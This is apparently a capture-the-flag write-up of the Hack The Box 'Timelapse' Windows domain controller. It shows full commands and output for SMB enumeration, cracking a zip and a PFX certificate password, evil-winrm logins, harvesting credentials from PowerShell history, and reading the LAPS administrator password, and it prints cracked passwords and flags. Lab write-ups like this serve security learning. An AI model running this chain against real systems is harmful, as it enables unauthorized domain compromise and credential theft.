# Recon
```
$ nmap -sV -sC 10.10.11.152 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-25 21:09 EEST
Nmap scan report for 10.10.11.152
Host is up (0.17s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-26 01:10:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m04s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-26T01:10:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.69 seconds

```
- on port 3268 (ldap) we have domain so we put it in our hosts file
- we have port 445 open so we go check smb with crackmapexcex **crackmapexec smb 10.10.11.152**
- we found that domain is indeed timelapse.htb but the name is DC01
- trying to enumrate shares and useres with crackmapexec but no luck
- try smbclient to enumrate shares with no password and we got shares
# enumrating SMB
```
$ crackmapexec smb 10.10.11.152 --users
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [-] Error enumerating domain users using dc ip 10.10.11.152: NTLM needs domain\username and a password
SMB         10.10.11.152    445    DC01             [*] Trying with SAMRPC protocol
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.10.11.152 --users --shares
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
SMB         10.10.11.152    445    DC01             [-] Error enumerating domain users using dc ip 10.10.11.152: NTLM needs domain\username and a password
SMB         10.10.11.152    445    DC01             [*] Trying with SAMRPC protocol
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.11.152      
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- now we go check the shares and start with **Shares**
- **smbclient //10.10.11.152/Shares**
- find two directories we try and gett all files with **mget***
- So we got an interesting backup file and other documents But this zip file is password protected
- crack it using fcrackzip and rockyou.txt
```
$ fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt


PASSWORD FOUND!!!!: pw == supremelegacy
```
- after unziping the file we got pfx file which is agrpup of certificates
- converting this pfx file to John compatible hash using pfx2john
```
─$ pfx2john legacyy_dev_auth.pfx >pfx_timelapse.hash
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ john -w=/usr/share/wordlists/rockyou.txt pfx_timelapse.hash --rule /usr/share/john/rules/rockyou-30000.rule
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:01:10 DONE (2023-07-25 21:47) 0.01426g/s 46088p/s 46088c/s 46088C/s thuglife06..thug211
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- found this [Blog](https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/) to extract certifcate and private key 
- after extracting them we need to check if the machine is listening on winrmm port and indeed it is on port 5986 but not in the nmap above because above is showing only the top ports
- we try to connect with winrm and yes we get a shell
```
$ evil-winrm -S -k legacy.key -c leg.cert -i 10.10.11.152 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> ls
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..
*Evil-WinRM* PS C:\Users\legacyy> dir


    Directory: C:\Users\legacyy


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/25/2021   8:25 AM                Desktop
d-r---       10/25/2021   8:22 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\legacyy> cd desktop
*Evil-WinRM* PS C:\Users\legacyy\desktop> ls


    Directory: C:\Users\legacyy\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/25/2023   7:25 AM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\desktop> cat user.txt
8af4ec585761b0df90e7de96437b70a1
```
# Privilege Escalation
- listing privileges of the current user **whoami /priv**
- check for users **cd C:\Users\\** --> **ls**
- Checking privileges with net user **net user legacyy**
- winpeas shows that history file is potential attack vector
- **cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\\**
- we found creds for svc_deploy which is used in PS-remoting
- we reuse the creds and pass the commands via ps-remoting
```
Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine type ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> 
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cd C:\Users
*Evil-WinRM* PS C:\Users> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
*Evil-WinRM* PS C:\Users> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
*Evil-WinRM* PS C:\Users> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
*Evil-WinRM* PS C:\Users> 
```
- itry to connect with pS remoring but i got and error certificate expireed
- try evilwinrm with the creds
- i got in with user svc_deploy
- it has the same permisions
- we check the groups with svc_deploy with netuser and it has LAP_readers Group i think we can access to read from LAPS
- **With LAPS, the DC manages the local administrator passwords for computers on the domain. It is common to create a group of users and give them permissions to read these passwords, allowing the trusted administrators access to all the local admin passwords.**
- To read the LAPS password: use Get-ADComputer and specifically request the ms-mcs-admpwd property
- now we got password for the local admin
- reconnect with evil-winrm **evil-winrm -i timelapse.htb -S -u administrator -p '5r4]VTk[#)[4A)pQ{[0s9Jrh'**
```
evil-winrm -i timelapse.htb -S -u administrator -p '5r4]VTk[#)[4A)pQ{[0s9Jrh'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
-We got ROOOT
- the root flag is missing but there are other users we check TRX user annd found it on thier desktop




